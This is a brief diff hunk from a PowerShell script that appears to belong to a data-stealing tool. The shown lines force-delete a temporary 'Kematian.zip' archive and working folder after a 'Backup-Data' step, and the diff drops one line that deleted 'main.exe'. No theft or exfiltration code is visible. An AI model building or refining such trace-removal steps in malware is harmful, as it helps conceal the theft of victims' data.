@@ -955,7 +955,6 @@ function Backup-Data {
 
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-    Remove-Item "$main_temp\main.exe" -Force
 }
 
 function Invoke-TASKS {
